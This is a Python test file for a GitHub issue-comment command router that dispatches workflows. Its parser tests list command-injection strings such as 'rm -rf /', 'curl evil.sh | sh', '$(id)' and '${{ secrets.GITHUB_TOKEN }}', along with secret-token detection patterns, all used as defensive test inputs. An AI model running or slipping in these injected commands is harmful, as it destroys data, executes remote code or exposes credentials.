#!/usr/bin/env python3
"""Offline tests for tools/buddy_control_plane.py (network and gh are always faked)."""
from __future__ import annotations

import copy
import io
import json
import re
import sys
import tempfile
import unittest
import urllib.error
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

import tools.buddy_control_plane as bcp  # noqa: E402

try:
    import yaml  # noqa: F401

    HAVE_YAML = True
except ImportError:  # pragma: no cover
    HAVE_YAML = False

REGISTRY = bcp.load_registry()
REPO = REGISTRY["repository"]
OWNER = REGISTRY["owners"][0]


class FakeAPI:
    """Stands in for GitHubAPI. Records every side effect."""

    def __init__(self, permissions=None, comments=None, dispatch_stdout="", run_url=None, dispatch_error=None):
        self.repo = REPO
        self.permissions = permissions if permissions is not None else {OWNER.casefold(): "admin"}
        self.comments = list(comments or [])
        self.posted: list[tuple[int, str]] = []
        self.dispatched: list[tuple[str, str, dict]] = []
        self.dispatch_stdout = dispatch_stdout
        self.run_url = run_url
        self.dispatch_error = dispatch_error

    def permission(self, login):
        return self.permissions.get(login.casefold(), "none")

    def issue_comments(self, number):
        return self.comments

    def post_comment(self, number, body):
        self.posted.append((number, body))

    def dispatch(self, workflow, ref, inputs):
        if self.dispatch_error:
            raise self.dispatch_error
        self.dispatched.append((workflow, ref, dict(inputs)))
        return self.dispatch_stdout

    def find_dispatched_run(self, workflow, since, attempts=6, delay=5.0):
        return self.run_url

    def latest_run(self, workflow, branch):
        return 200, {"status": "completed", "conclusion": "success", "html_url": f"https://github.com/{REPO}/actions/runs/1", "run_number": 1}


def comment_event(body, actor=OWNER, number=7):
    return {"event_name": "issue_comment", "action": "created", "actor": actor, "issue_number": str(number),
            "issue_author": "someone-else", "comment_body": body}


def issue_event(title, body="", actor=OWNER, author=None, action="opened", label="buddy-command"):
    return {"event_name": "issues", "action": action, "actor": actor, "issue_number": "9",
            "issue_author": author or actor, "issue_title": title, "issue_body": body, "label_name": label}


class RegistrySchemaTest(unittest.TestCase):
    def test_shipped_registry_is_valid_without_workflow_files(self):
        self.assertEqual(bcp.check_registry(REGISTRY, workflows_dir=None), [])

    def test_shipped_registry_matches_real_workflows(self):
        errs = bcp.check_registry(REGISTRY, bcp.WORKFLOWS_DIR)
        if not HAVE_YAML:
            # Fail closed: without PyYAML the cross-check must refuse, never pass.
            self.assertEqual(errs, [bcp.YAML_REQUIRED])
            return
        self.assertEqual(errs, [])

    def test_every_requested_job_family_is_registered(self):
        families = {j["family"] for j in REGISTRY["jobs"]}
        for fam in ["connectivity scan", "goals -> gates", "gap closure", "system watch", "cert gate",
                    "benchmarks/evidence", "branch health", "HF study packs + hub drills", "bootcamp",
                    "Pages link check", "fleet status", "O*NET/data-package build", "curriculum/edu",
                    "observability", "problem registry", "actions failure sweep"]:
            self.assertIn(fam, families)

    def test_seed_operator(self):
        self.assertIn("ireanjordan24", REGISTRY["operators"])

    def mutate(self, fn):
        reg = copy.deepcopy(REGISTRY)
        fn(reg)
        return bcp.check_registry(reg, workflows_dir=None)

    def job(self, reg, job_id):
        return bcp.jobs_by_id(reg)[job_id]

    def test_money_tier_cannot_be_triggerable(self):
        errs = self.mutate(lambda r: self.job(r, "money_os_ci").update(triggerable=True))
        self.assertTrue(any("money tier can never be triggerable" in e for e in errs))

    def test_money_tier_must_not_be_dispatchable(self):
        errs = self.mutate(lambda r: r["risk_tiers"]["money"].update(dispatchable=True))
        self.assertTrue(any("money.dispatchable" in e for e in errs))

    def test_destructive_cannot_be_triggerable(self):
        errs = self.mutate(lambda r: self.job(r, "issue_cleaner").update(triggerable=True))
        self.assertTrue(any("destructive" in e for e in errs))

    def test_writes_code_needs_owner_approval(self):
        errs = self.mutate(lambda r: self.job(r, "branch_health_resolve").update(requires_owner_approval=False))
        self.assertTrue(any("writes_code requires owner approval" in e for e in errs))

    def test_owner_must_be_operator(self):
        errs = self.mutate(lambda r: r.update(owners=["not-an-operator"]))
        self.assertTrue(any("owner must also be an operator" in e for e in errs))

    def test_duplicate_and_bad_ids(self):
        def dup(r):
            r["jobs"].append(copy.deepcopy(r["jobs"][0]))
            r["jobs"].append(dict(r["jobs"][0], id="Bad-ID"))
        errs = self.mutate(dup)
        self.assertTrue(any("duplicate job id" in e for e in errs))
        self.assertTrue(any("invalid job id" in e for e in errs))

    def test_router_cannot_dispatch_itself(self):
        errs = self.mutate(lambda r: self.job(r, "system_watch").update(workflow="buddy-command-router.yml"))
        self.assertTrue(any("router cannot dispatch itself" in e for e in errs))

    def test_bad_input_specs(self):
        def bad(r):
            self.job(r, "system_watch")["inputs"] = {"x": {"type": "string", "pattern": ".*"}, "Y": {"type": "choice", "options": ["a;b"]}}
        errs = self.mutate(bad)
        self.assertTrue(any("anchored pattern" in e for e in errs))
        self.assertTrue(any("invalid input name" in e for e in errs))

    def test_workflow_cross_check_catches_write_tokens_and_missing_inputs(self):
        with tempfile.TemporaryDirectory() as tmp:
            wf = Path(tmp)
            (wf / "ro.yml").write_text("on:\n  workflow_dispatch:\npermissions:\n  contents: write\njobs: {}\n")
            (wf / "nodispatch.yml").write_text("on:\n  push:\npermissions:\n  contents: read\njobs: {}\n")
            reg = copy.deepcopy(REGISTRY)
            reg["jobs"] = [
                {"id": "ro_job", "family": "f", "title": "t", "workflow": "ro.yml", "risk_tier": "read_only",
                 "requires_owner_approval": False, "triggerable": True, "inputs": {"mode": {"type": "choice", "options": ["a"]}}},
                {"id": "nd_job", "family": "f", "title": "t", "workflow": "nodispatch.yml", "risk_tier": "read_only",
                 "requires_owner_approval": False, "triggerable": True, "inputs": {}},
                {"id": "gone_job", "family": "f", "title": "t", "workflow": "gone.yml", "risk_tier": "read_only",
                 "requires_owner_approval": False, "triggerable": True, "inputs": {}},
            ]
            errs = bcp.check_registry(reg, wf)
        if not HAVE_YAML:
            self.assertEqual(errs, [bcp.YAML_REQUIRED])
            return
        self.assertTrue(any("token can write" in e for e in errs))
        self.assertTrue(any("does not declare input mode" in e for e in errs))
        self.assertTrue(any("no workflow_dispatch" in e for e in errs))
        self.assertTrue(any("does not exist" in e for e in errs))

    def test_writes_code_that_pushes_to_main_is_rejected(self):
        with tempfile.TemporaryDirectory() as tmp:
            wf = Path(tmp)
            (wf / "pusher.yml").write_text(
                "on:\n  workflow_dispatch:\npermissions:\n  contents: write\njobs:\n  a:\n    runs-on: x\n    steps:\n"
                "      - run: |\n          git commit -m x\n          git push\n")
            reg = copy.deepcopy(REGISTRY)
            reg["jobs"] = [{"id": "code_job", "family": "f", "title": "t", "workflow": "pusher.yml", "risk_tier": "writes_code",
                            "requires_owner_approval": True, "triggerable": True, "inputs": {}}]
            errs = bcp.check_registry(reg, wf)
        if not HAVE_YAML:
            self.assertEqual(errs, [bcp.YAML_REQUIRED])
            return
        self.assertTrue(any("must be PR-only" in e for e in errs))

    def test_public_copy_is_in_sync(self):
        self.assertEqual(bcp.PUBLIC_REGISTRY_PATH.read_text(encoding="utf-8"), bcp.public_registry_text(REGISTRY))


class ParserTest(unittest.TestCase):
    def test_valid_run_with_inputs(self):
        cmd = bcp.parse_command_line("/buddy run onet_catalog mode=standard")
        self.assertEqual((cmd.verb, cmd.job_id, cmd.inputs), ("run", "onet_catalog", {"mode": "standard"}))

    def test_list_status_help(self):
        self.assertEqual(bcp.parse_command_line("/buddy list").verb, "list")
        self.assertEqual(bcp.parse_command_line("/buddy").verb, "help")
        st = bcp.parse_command_line("/buddy status cert_gate")
        self.assertEqual((st.verb, st.job_id), ("status", "cert_gate"))

    def test_injection_attempts_are_rejected(self):
        attempts = [
            "/buddy run system_watch; rm -rf /",
            "/buddy run system_watch && curl evil.sh | sh",
            "/buddy run $(id)",
            "/buddy run `id`",
            "/buddy run onet_catalog mode=$(whoami)",
            "/buddy run onet_catalog mode=quick;id",
            "/buddy run onet_catalog mode=`id`",
            "/buddy run onet_catalog mode=a|b",
            "/buddy run onet_catalog mode=../../etc",
            "/buddy run onet_catalog 'mode=quick'",
            "/buddy run onet_catalog mode=\"quick\"",
            "/buddy run onet_catalog --ref=evil",
            "/buddy run onet_catalog mode==quick",
            "/buddy run onet_catalog MODE=quick",
            "/buddy run onet_catalog mode=quick mode=maximum",
            "/buddy run system_watch\tx=1",
            "/buddy run system_watch\nmode=quick",
            "/buddy run sуstem_watch",  # Cyrillic homoglyph
            "/buddy run ${{ secrets.GITHUB_TOKEN }}",
            "/buddy run System_Watch",
            "/buddy run system_watch " + "a=b " * 40,
            "/buddy exec system_watch",
            "/buddyrun system_watch",
            "/buddy list extra",
        ]
        for line in attempts:
            with self.subTest(line=line):
                with self.assertRaises(bcp.CommandError):
                    bcp.parse_command_line(line)

    def test_inputs_block_is_strict(self):
        inputs = bcp.parse_inputs_block("hi\n```buddy-inputs\nmode=quick\n# note\n```\n", {})
        self.assertEqual(inputs, {"mode": "quick"})
        for bad in ["```buddy-inputs\nmode=quick; id\n```", "```buddy-inputs\nmode=$(id)\n```",
                    "```buddy-inputs\nmode=a\n```\n```buddy-inputs\nx=b\n```"]:
            with self.subTest(bad=bad):
                with self.assertRaises(bcp.CommandError):
                    bcp.parse_inputs_block(bad, {})

    def test_comment_uses_first_line_only_for_command(self):
        cmd = bcp.command_from_event(comment_event("/buddy run bootcamp\nplease and thanks; rm -rf /"))
        self.assertEqual((cmd.job_id, cmd.inputs), ("bootcamp", {}))


class ValidateTest(unittest.TestCase):
    def run_cmd(self, line):
        return bcp.validate_run(REGISTRY, bcp.parse_command_line(line))

    def test_unknown_job(self):
        with self.assertRaisesRegex(bcp.CommandError, "unknown job"):
            self.run_cmd("/buddy run does_not_exist")

    def test_money_tier_blocked(self):
        for job_id in ("money_os_ci", "business_data_trade_readiness"):
            with self.subTest(job=job_id):
                with self.assertRaisesRegex(bcp.CommandError, "money tier"):
                    self.run_cmd(f"/buddy run {job_id}")

    def test_money_blocked_even_if_registry_tampered(self):
        reg = copy.deepcopy(REGISTRY)
        bcp.jobs_by_id(reg)["money_os_ci"]["triggerable"] = True
        reg["risk_tiers"]["money"]["dispatchable"] = True
        with self.assertRaisesRegex(bcp.CommandError, "money tier"):
            bcp.validate_run(reg, bcp.parse_command_line("/buddy run money_os_ci"))

    def test_destructive_and_blocked_jobs(self):
        with self.assertRaisesRegex(bcp.CommandError, "destructive"):
            self.run_cmd("/buddy run issue_cleaner")
        with self.assertRaisesRegex(bcp.CommandError, "not triggerable"):
            self.run_cmd("/buddy run branch_health_resolve")
        with self.assertRaisesRegex(bcp.CommandError, "not triggerable"):
            self.run_cmd("/buddy run bot_production_readiness")

    def test_inputs_validated_against_registry(self):
        job, final = self.run_cmd("/buddy run onet_catalog")
        self.assertEqual(final, {"mode": "quick"})
        _, final = self.run_cmd("/buddy run onet_catalog mode=maximum")
        self.assertEqual(final, {"mode": "maximum"})
        with self.assertRaisesRegex(bcp.CommandError, "must be one of"):
            self.run_cmd("/buddy run onet_catalog mode=turbo")
        with self.assertRaisesRegex(bcp.CommandError, "not allowed"):
            self.run_cmd("/buddy run system_watch ref=feature")

    def test_fixed_inputs_forced_and_not_overridable(self):
        _, final = self.run_cmd("/buddy run branch_health_scan")
        self.assertEqual(final, {"resolve": "false"})
        with self.assertRaisesRegex(bcp.CommandError, "fixed by policy"):
            self.run_cmd("/buddy run branch_health_scan resolve=true")


class AuthTest(unittest.TestCase):
    def test_operator_with_write(self):
        self.assertTrue(bcp.authorize(REGISTRY, OWNER, "admin").allowed)
        self.assertTrue(bcp.authorize(REGISTRY, OWNER.upper(), "write").allowed)

    def test_non_operator_rejected_even_with_admin(self):
        d = bcp.authorize(REGISTRY, "random-user", "admin")
        self.assertFalse(d.allowed)
        self.assertIn("not a Buddy operator", d.reason)

    def test_operator_without_write_rejected(self):
        for perm in ("read", "triage", "none", None):
            with self.subTest(perm=perm):
                self.assertFalse(bcp.authorize(REGISTRY, OWNER, perm).allowed)

    def test_bot_and_invalid_logins_rejected(self):
        for actor in ("github-actions[bot]", "", "a b", "-x", "x" * 50):
            with self.subTest(actor=actor):
                self.assertFalse(bcp.authorize(REGISTRY, actor, "admin").allowed)

    def test_issue_author_must_be_operator(self):
        d = bcp.authorize(REGISTRY, OWNER, "admin", issue_author="drive-by")
        self.assertFalse(d.allowed)

    def test_owner_approval_jobs_need_owner(self):
        reg = copy.deepcopy(REGISTRY)
        reg["operators"] = reg["operators"] + ["helper-op"]
        job = bcp.jobs_by_id(reg)["pages_publish"]
        self.assertFalse(bcp.authorize(reg, "helper-op", "write", job).allowed)
        self.assertTrue(bcp.authorize(reg, "helper-op", "write", bcp.jobs_by_id(reg)["system_watch"]).allowed)
        self.assertTrue(bcp.authorize(reg, OWNER, "admin", job).allowed)


class RouteTest(unittest.TestCase):
    def test_valid_run_dispatches_and_comments_run_url(self):
        url = f"https://github.com/{REPO}/actions/runs/123"
        api = FakeAPI(run_url=url)
        code, body = bcp.route(comment_event("/buddy run onet_catalog mode=standard"), REGISTRY, api)
        self.assertEqual(code, 0)
        self.assertEqual(api.dispatched, [("run-everything-now.yml", "main", {"mode": "standard"})])
        self.assertIn(url, body)
        self.assertEqual(len(api.posted), 1)

    def test_run_url_from_gh_stdout(self):
        url = f"https://github.com/{REPO}/actions/runs/999"
        api = FakeAPI(dispatch_stdout=f"Created workflow_dispatch event\n{url}\n")
        _, body = bcp.route(comment_event("/buddy run system_watch"), REGISTRY, api)
        self.assertIn(url, body)

    def test_non_operator_is_rejected_without_dispatch(self):
        api = FakeAPI(permissions={"mallory": "admin"})
        code, body = bcp.route(comment_event("/buddy run system_watch", actor="mallory"), REGISTRY, api)
        self.assertEqual(code, 0)
        self.assertEqual(api.dispatched, [])
        self.assertIn("not a Buddy operator", body)

    def test_money_and_unknown_rejected_without_dispatch(self):
        for line, reason in (("/buddy run money_os_ci", "money tier"), ("/buddy run nope_job", "unknown job")):
            with self.subTest(line=line):
                api = FakeAPI()
                _, body = bcp.route(comment_event(line), REGISTRY, api)
                self.assertEqual(api.dispatched, [])
                self.assertIn(reason, body)

    def test_injection_comment_rejected_and_not_echoed(self):
        api = FakeAPI()
        _, body = bcp.route(comment_event("/buddy run system_watch; curl x | sh @everyone"), REGISTRY, api)
        self.assertEqual(api.dispatched, [])
        self.assertNotIn("curl", body)
        self.assertNotIn("@everyone", body)

    def test_invalid_registry_fails_closed(self):
        reg = copy.deepcopy(REGISTRY)
        reg["owners"] = ["someone-not-operator"]
        api = FakeAPI()
        _, body = bcp.route(comment_event("/buddy run system_watch"), reg, api)
        self.assertEqual(api.dispatched, [])
        self.assertIn("fail closed", body)

    def test_issue_command_with_inputs_block(self):
        api = FakeAPI(run_url=f"https://github.com/{REPO}/actions/runs/5")
        ev = issue_event("/buddy run onet_catalog", "From Pages\n\n```buddy-inputs\nmode=maximum\n```\n")
        code, body = bcp.route(ev, REGISTRY, api)
        self.assertEqual(api.dispatched, [("run-everything-now.yml", "main", {"mode": "maximum"})])
        self.assertIn(bcp.ISSUE_MARKER, body)

    def test_issue_opened_and_labeled_dispatch_once(self):
        api = FakeAPI(comments=[{"body": bcp.ISSUE_MARKER + "\nalready handled"}])
        code, body = bcp.route(issue_event("/buddy run system_watch", action="labeled"), REGISTRY, api)
        self.assertEqual((code, body, api.dispatched, api.posted), (0, None, [], []))

    def test_other_label_is_ignored(self):
        api = FakeAPI()
        code, body = bcp.route(issue_event("/buddy run system_watch", action="labeled", label="bug"), REGISTRY, api)
        self.assertEqual((code, body, api.dispatched), (0, None, []))

    def test_issue_by_non_operator_labeled_by_owner_is_rejected(self):
        api = FakeAPI()
        _, body = bcp.route(issue_event("/buddy run system_watch", author="drive-by", action="labeled"), REGISTRY, api)
        self.assertEqual(api.dispatched, [])
        self.assertIn("issue author", body)

    def test_list_and_status(self):
        api = FakeAPI()
        _, body = bcp.route(comment_event("/buddy list"), REGISTRY, api)
        self.assertIn("`system_watch`", body)
        _, body = bcp.route(comment_event("/buddy status system_watch"), REGISTRY, api)
        self.assertIn("success", body)
        self.assertEqual(api.dispatched, [])

    def test_dispatch_failure_is_reported_and_nonzero(self):
        api = FakeAPI(dispatch_error=RuntimeError("gh workflow run failed (exit 1)"))
        code, body = bcp.route(comment_event("/buddy run system_watch"), REGISTRY, api)
        self.assertEqual(code, 1)
        self.assertIn("dispatch failed", body)


class GitHubAPITest(unittest.TestCase):
    def test_dispatch_uses_argument_list_without_shell(self):
        calls = []

        class Proc:
            returncode = 0
            stdout = ""

        def runner(args, **kwargs):
            calls.append((args, kwargs))
            return Proc()

        api = bcp.GitHubAPI(REPO, "t", runner=runner)
        api.dispatch("run-everything-now.yml", "main", {"mode": "quick"})
        args, kwargs = calls[0]
        self.assertEqual(args, ["gh", "workflow", "run", "run-everything-now.yml", "--repo", REPO, "--ref", "main", "-f", "mode=quick"])
        self.assertNotIn("shell", kwargs)
        with self.assertRaises(RuntimeError):
            api.dispatch("x.yml", "main", {"mode": "quick;id"})
        with self.assertRaises(RuntimeError):
            api.dispatch("../x.yml", "main", {})

    def test_permission_parsing(self):
        def opener_for(payload, code=200):
            def opener(req, timeout=None):
                if code != 200:
                    raise urllib.error.HTTPError(req.full_url, code, "x", {}, None)
                resp = io.BytesIO(json.dumps(payload).encode())
                resp.status = 200
                resp.__enter__ = lambda s=resp: s
                resp.__exit__ = lambda *a: False
                return _Ctx(resp)
            return opener

        class _Ctx:
            def __init__(self, r):
                self.r = r
            def __enter__(self):
                return self.r
            def __exit__(self, *a):
                return False

        api = bcp.GitHubAPI(REPO, "t", opener=opener_for({"permission": "write", "role_name": "maintain"}))
        self.assertEqual(api.permission(OWNER), "maintain")
        api = bcp.GitHubAPI(REPO, "t", opener=opener_for({"permission": "read", "role_name": "read"}))
        self.assertEqual(api.permission(OWNER), "read")
        api = bcp.GitHubAPI(REPO, "t", opener=opener_for({}, code=404))
        self.assertEqual(api.permission(OWNER), "none")
        api = bcp.GitHubAPI(REPO, "t", opener=opener_for({}, code=500))
        self.assertIsNone(api.permission(OWNER))
        self.assertIsNone(api.permission("bad login"))


class StatusTest(unittest.TestCase):
    def test_status_states_and_url_sanitizing(self):
        class API(FakeAPI):
            def latest_run(self, workflow, branch):
                if workflow == "buddy-pages-link-check.yml":
                    return 404, None
                if workflow == "cert_gate.yml":
                    return 500, None
                if workflow == "full-system-certification.yml":
                    return 200, {"status": "completed", "conclusion": "failure", "html_url": "javascript:alert(1)"}
                if workflow == "benchmark-tracker.yml":
                    return 200, None
                return 200, {"status": "in_progress", "html_url": f"https://github.com/{REPO}/actions/runs/2", "run_number": 2}

        snap = bcp.build_status(REGISTRY, API())
        jobs = snap["jobs"]
        self.assertEqual(snap["schema"], bcp.STATUS_SCHEMA)
        self.assertEqual(jobs["pages_link_check"]["state"], "workflow_missing")
        self.assertEqual(jobs["cert_gate"]["state"], "failure")
        self.assertIsNone(jobs["cert_gate"]["run_url"])
        self.assertEqual(jobs["benchmark_tracker"]["state"], "never_run")
        self.assertEqual(jobs["system_watch"]["state"], "in_progress")
        self.assertEqual(set(jobs), set(bcp.jobs_by_id(REGISTRY)))

    def test_offline_snapshot_is_unavailable_not_green(self):
        snap = bcp.build_status(REGISTRY, None)
        self.assertEqual(snap["source"], "unavailable")
        self.assertTrue(all(j["state"] == "unavailable" for j in snap["jobs"].values()))

    def test_published_status_has_no_secrets(self):
        text = bcp.PUBLIC_STATUS_PATH.read_text(encoding="utf-8")
        data = json.loads(text)
        self.assertEqual(data["schema"], bcp.STATUS_SCHEMA)
        self.assertNotRegex(text, r"gh[pousr]_[A-Za-z0-9]{20,}|github_pat_|Bearer ")


class WorkflowAndPagesTest(unittest.TestCase):
    ROUTER = ROOT / ".github" / "workflows" / "buddy-command-router.yml"

    def test_router_workflow_hardening(self):
        text = self.ROUTER.read_text(encoding="utf-8")
        code = "\n".join(l for l in text.splitlines() if not l.lstrip().startswith("#"))
        self.assertNotIn("pull_request_target", code)
        self.assertIn("permissions: {}", text)
        for line in re.findall(r"uses:\s*(\S+)", text):
            self.assertRegex(line, r"@[0-9a-f]{40}$", "actions must be pinned by SHA")
        run_lines = re.findall(r"^\s*run:\s*(.*)$", text, re.MULTILINE)
        self.assertEqual(run_lines, ["python3 tools/buddy_control_plane.py route"])
        self.assertNotRegex(text, r"run:[^\n]*\$\{\{")

    def test_router_permissions_are_minimal(self):
        text = self.ROUTER.read_text(encoding="utf-8")
        self.assertRegex(text, r"(?m)^permissions: \{\}$")
        block = re.search(r"(?m)^    permissions:\n((?:      .+\n)+)", text)
        self.assertIsNotNone(block)
        perms = dict(line.strip().split(": ", 1) for line in block.group(1).splitlines())
        self.assertEqual(perms, {"actions": "write", "issues": "write", "contents": "read"})
        triggers = re.findall(r"(?m)^  ([a-z_]+):$", text.split("\npermissions:")[0])
        self.assertEqual(triggers, ["issues", "issue_comment"])

    def test_pages_panel_is_static_and_linked(self):
        html = (ROOT / "website" / "buddy-control.html").read_text(encoding="utf-8")
        js = (ROOT / "website" / "buddy-control.js").read_text(encoding="utf-8")
        self.assertIn("buddy-control.js", html)
        self.assertIn("Runs require an authorized operator", html)
        for text in (html, js):
            self.assertNotRegex(text, r"gh[pousr]_[A-Za-z0-9]{20,}|github_pat_|Authorization|sk_live_")
        self.assertIn("/issues/new?title=", js)
        self.assertIn("buddy-control.html", (ROOT / "website" / "nav.js").read_text(encoding="utf-8"))


if __name__ == "__main__":
    unittest.main()
